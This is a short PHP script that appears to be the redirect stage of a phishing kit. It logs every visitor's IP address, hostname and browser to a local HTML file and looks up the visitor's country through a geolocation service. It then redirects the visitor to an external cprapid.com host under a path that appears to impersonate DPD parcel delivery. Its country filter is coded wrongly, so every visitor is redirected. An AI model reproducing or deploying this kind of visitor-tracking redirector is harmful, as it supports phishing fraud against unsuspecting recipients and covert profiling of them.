<?php


session_start();

	
$user_agent = $_SERVER['HTTP_USER_AGENT'];
$ip = getenv("REMOTE_ADDR");
$time = date('Y-m-d H:i:s');
$random = md5($time);

$logfile= 'log.html'; 
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$logdetails= date("F j, Y, g:i a") . ': ' . '<a href=http://www.ip-score.com/checkip/'.$ip.' target=_blank>'.$_SERVER['REMOTE_ADDR'].'</a> - '.$hostname.' - '.$user_agent.'<br>'; 
$fp = fopen($logfile, "a+");
fwrite($fp, $logdetails);
fclose($fp);


$random2=rand(0,100000000000);
$randomlink = md5($random2);


function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
	
	$country = visitor_country();


if(strpos($country, "Italy") !== true)
{

header("Location: https://52-156-86-153.cprapid.com/.well-known/dpd/");

}else{

header("HTTP/1.0 404 Not Found");
        die("<h1>404 Not Found</h1>The page that you have requested could not be found.");

 }
?>
